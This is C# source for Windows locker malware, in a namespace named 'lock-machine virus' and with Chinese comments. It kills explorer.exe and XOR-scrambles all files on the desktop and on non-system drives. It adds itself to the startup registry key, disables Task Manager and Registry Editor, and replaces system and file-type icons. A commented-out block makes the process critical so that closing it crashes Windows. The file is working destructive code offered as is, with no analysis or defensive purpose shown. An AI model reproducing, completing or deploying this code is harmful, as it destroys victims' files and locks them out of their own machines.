using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 锁机病毒
{

    internal static class Program
    {
        [DllImport("shell32.dll")]
        static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            Process[] pro = Process.GetProcessesByName("CarParkInspectApp");
            if (pro == null || pro.Length >= 2)
            {
                //MessageBox.Show("已打开，请勿重复打开！");
                Application.Exit();
                return;
            }

            //运行次数
            Properties.Settings.Default.times++;
            Properties.Settings.Default.Save();

            try
            {
                //杀死explorer
                Process process_CMD = new Process();
                process_CMD.StartInfo.FileName = "cmd.exe";//进程打开文件名为“cmd”
                process_CMD.StartInfo.RedirectStandardInput = true;//是否可以输入
                process_CMD.StartInfo.RedirectStandardOutput = true;//是否可以输出
                process_CMD.StartInfo.CreateNoWindow = true;//不创建窗体 也就是隐藏窗体
                process_CMD.StartInfo.UseShellExecute = false;//是否使用系统shell执行，否

                process_CMD.Start();

                process_CMD.StandardInput.WriteLine("taskkill /im explorer.exe /f ");
            }
            catch (Exception ex)
            {
                //错误处理
                //MessageBox.Show("尚未执行杀进程成功");
            }

            // 获取资源库设置好的 IsFirstRun 设置的值
            bool isFirstRun = Properties.Settings.Default.IsFirstRun;
            // 如果是第一次运行，则执行操作，并将 IsFirstRun 设置为 false
            if (isFirstRun == true)
            {
                //MessageBox.Show("第一次运行");
                // TODO: 执行第一次运行的操作

                // 设置 IsFirstRun 为 false
                Properties.Settings.Default.IsFirstRun = false;
                Properties.Settings.Default.Save();

                // 创建一个新的线程并开始执行
                //桌面文件加密
                Thread thread = new Thread(new ThreadStart(WorkerThread));
                thread.Start();

                //注册表修改
                Thread thread2 = new Thread(new ThreadStart(WorkerThreadregedit));
                thread2.Start();
                //MessageBox.Show("初级运行成功");

                //磁盘全部文件加密
                Thread thread3 = new Thread(new ThreadStart(Alljiami));
                thread3.Start();
            }
            else
            {
                // TODO: 第二次运行执行的地方
                //MessageBox.Show("第二次运行");
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            //MessageBox.Show("窗体运行成功");
        }

        private static void WorkerThread()
        {
            //MessageBox.Show("正在加密桌面");
            //以下代码可以获取桌面文件夹中的所有文件路径：
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            
            string[] files = TraverseDirectory(desktopPath);

            // 遍历桌面上的所有文件
            foreach (string file in files)
            {
                try
                {
                    // 读取文件内容到字节数组中
                    byte[] buffer = File.ReadAllBytes(file);

                    // 如果文件大小超过2GB，则不进行加密处理
                    /*
                    if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
                    {
                        continue;
                    }
                    */

                    // 删除原始文件
                    File.Delete(file);

                    // 遍历字节数组中的每个字节，对其进行加密操作
                    for (int i = 0; i < buffer.Length; i++)
                    {
                        buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
                    }

                    // 将加密后的字节数组写回到原始文件中
                    File.WriteAllBytes(file, buffer);
                }
                catch (Exception ex)
                {
                    // 处理异常
                    //MessageBox.Show("桌面加密失败");
                }
            }
        }

        static void WorkerThreadregedit()
        {
            string where = Process.GetCurrentProcess().MainModule.FileName;
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey subKey = key.CreateSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            // 将程序路径添加到开机注册表
            subKey.SetValue("病毒", where);


            //禁止打开注册表
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, RegistryValueKind.DWord);

             //禁止打开任务管理器
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);

            //Application.ExecutablePath为本程序路径
            // 设置文件夹图标path的值为1-44
            try
            {
                // 设置“我的电脑”图标
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
                
                // 设置“控制面板”图标
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
                
                // 设置“回收站”图标
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
                
                // 设置“文件夹”图标


                // 设置“网络上的计算机”图标
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
                
                // 设置“我的文档”图标
                Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

                // 设置“我的图片”图标
                //Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);


                string[] types = { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".csv", ".xml", ".html", ".htm", ".css", ".js", ".c", ".cpp", ".h", ".hpp", ".cs", ".java", ".php", ".py", ".rb", ".pl", ".sql", ".json", ".md", ".bmp", ".gif", ".jpeg", ".jpg", ".png", ".ico", ".exe", ".dll", ".msi", ".bat", ".cmd", ".reg", ".ini", ".log", ".rar", ".zip", ".7z", ".tar", ".gz", ".mp3", ".wav", ".aac", ".flac", ".ape", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".swf", ".iso", ".img", ".vhd", ".vhdx", ".bak", ".db", ".mdb", ".accdb", ".dbf", ".sqlite", ".sqlitedb", ".mdf", ".ldf", ".pptm", ".xlsm", ".docm", ".ppsm", ".jar", ".war", ".ear", ".apk", ".ipa", ".deb", ".rpm", ".tgz", ".bz2", ".dmg", ".img", ".iso", ".toast", ".vcd", ".md", ".markdown", ".csv", ".xlsx", ".docx", ".pptx", ".key", ".pps", ".pps", ".odt", ".ods", ".odp", ".msg", ".eml" };

                // 遍历所有文件类型注册表项
                try
                {
                    foreach (string ext in types)
                    {
                        // 获取文件类型注册表项
                        RegistryKey extKey = Registry.ClassesRoot.OpenSubKey(ext, true);
                        if (extKey == null) continue;

                        // 在文件类型注册表项中添加子键 DefaultIcon，并将其默认值设为图标库文件路径和图标索引
                        string iconPath = @"C:\MyIcons\MyIcons.dll,0"; // 图标库文件路径和图标索引
                        extKey.CreateSubKey("DefaultIcon").SetValue("", Application.ExecutablePath);
                    }
                }
                catch(Exception ex)
                {
                    //处理失败
                }

                //MessageBox.Show("注册表修改完毕");
                SHChangeNotify(0x08000000, 0x0000, IntPtr.Zero, IntPtr.Zero);
            }
            catch
            {
                //MessageBox.Show("注册表修改出错");
            }
        }

        static void Alljiami()//对盘符所有文件加密
        {
            //MessageBox.Show("正在加密磁盘");
            // 获取所有盘符信息
            DriveInfo[] drives = DriveInfo.GetDrives();

            // 遍历每个盘符
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Fixed && !drive.IsReady)
                {
                    // 过滤未准备好的驱动器
                    continue;
                }

                if (drive.DriveType == DriveType.CDRom)
                {
                    continue; // 排除光驱、无根目录等类型的驱动器
                }
                
                if (drive.Name == @"C:\")
                {
                    // 过滤系统盘
                    continue;
                }
                
                //MessageBox.Show("准备遍历所有文件");
                string[] files = TraverseDirectory(drive.Name);
                try
                {
                    //MessageBox.Show("得到盘符" + drive.Name);
                    // 遍历当前盘符下的所有文件
                    //files = Directory.GetFiles(drive.Name, "*.*", SearchOption.AllDirectories);


                    // 输出所有文件路径
                    foreach (string file in files)
                    {
                        //MessageBox.Show("得到文件" + file);
                        //执行
                        try
                        {
                            // 读取文件内容到字节数组中
                            byte[] buffer = File.ReadAllBytes(file);

                            // 如果文件大小超过2GB，则不进行加密处理
                            
                            if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
                            {
                                continue;
                            }
                            

                            // 删除原始文件
                            File.Delete(file);

                            // 遍历字节数组中的每个字节，对其进行加密操作
                            for (int i = 0; i < buffer.Length; i++)
                            {
                                buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
                            }

                            // 将加密后的字节数组写回到原始文件中
                            File.WriteAllBytes(file, buffer);
                        }
                        catch (Exception ex)
                        {
                            // 处理异常
                        }
                    }
                }
                catch (Exception ex)
                {
                    //error
                    //MessageBox.Show("遍历文件出错");
                }
            }

        }

        // 遍历指定目录下的所有文件和子目录的自定义运行函数TraverseDirectory()
        static string[] TraverseDirectory(string path)
        {
            List<string> fileList = new List<string>();
            try
            {
                // 获取当前目录下的所有文件
                string[] files = Directory.GetFiles(path);
                foreach (string file in files)
                {
                    fileList.Add(file);
                }

                // 递归获取所有子目录下的文件
                string[] dirs = Directory.GetDirectories(path);
                foreach (string dir in dirs)
                {
                    fileList.AddRange(TraverseDirectory(dir));
                }
            }
            catch (Exception ex)
            {
                // 处理异常
                //MessageBox.Show("处理遍历函数出错");
            }
            return fileList.ToArray();
        }

    }
}

/*
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////关闭窗体就蓝屏效果
//添加System.Runtime.InteropServices和System.Diagnostics的引用

//声明引用
[DllImport("ntdll.dll", SetLastError = true)]
private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
//窗体关闭事件，在窗体事件中的FormClosing
private void Form1_FormClosing(object sender, FormClosingEventArgs e)
{
    int isCritical = 1;  // we want this to be a Critical Process
    int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

    Process.EnterDebugMode();  //acquire Debug Privileges

    // setting the BreakOnTermination = 1 for the current process
    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/